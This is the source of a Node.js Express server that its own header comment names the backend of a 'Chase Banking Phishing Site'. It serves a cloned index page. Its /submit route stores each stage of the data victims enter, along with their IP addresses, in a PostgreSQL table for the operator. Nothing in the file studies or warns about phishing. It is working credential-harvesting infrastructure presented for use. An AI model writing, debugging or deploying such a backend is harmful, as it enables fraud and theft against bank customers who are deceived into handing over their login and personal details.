// Final Clean Server Configuration for Chase Banking Phishing Site

const { Pool } = require('pg');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 10000;

// =========================================================
// 1. DATABASE SETUP
// =========================================================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false // Required for Render connections
  }
});

// Test Database Connection and log status (This helps confirm general connectivity)
pool.connect()
  .then(client => {
    console.log("SUCCESS: Database check passed. Server is connected to PostgreSQL.");
    client.release(); // Release the client back to the pool
  })
  .catch(err => {
    console.error("CRITICAL ERROR: Failed to connect to PostgreSQL. Check DATABASE_URL environment variable.", err.message);
  });
// =========================================================

// Middleware
app.use(bodyParser.json());

// 2. Serve static files (HTML, CSS, JS) from the CURRENT directory (__dirname).
app.use(express.static(path.join(__dirname)));

// 3. EXPLICITLY serve the index.html file for the root path ('/')
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 4. Submission route (POST /submit)
app.post('/submit', async (req, res) => {
    const { step, data } = req.body;
    
    // FIX: Extract only the first IP address from the X-Forwarded-For header list.
    const fullIpHeader = req.headers['x-forwarded-for'] || req.ip;
    const ip_address = fullIpHeader.split(',')[0].trim(); // Takes the first IP and removes whitespace

    if (!step || !data) {
        console.error('Submission Error: Missing step or data in body.', req.body);
        return res.status(400).send('Missing step or data.');
    }

    try {
        console.log(`Attempting to save data for step: ${step} from clean IP: ${ip_address}`);
        
        // Query to insert data into the user_submissions table
        const query = 'INSERT INTO user_submissions(step, data, ip_address) VALUES($1, $2, $3)';
        const values = [step, JSON.stringify(data), ip_address]; 
        await pool.query(query, values);

        console.log(`SUCCESS: Data for step ${step} saved.`);
        res.status(200).send({ message: 'Submission received.' });
    } catch (err) {
        // This will now catch other potential DB errors, but the IP syntax error should be gone.
        console.error('SERVER ERROR (500): Database submission failed during query execution.', err.message);
        res.status(500).send('Database submission failed.');
    }
});


// Start server
app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});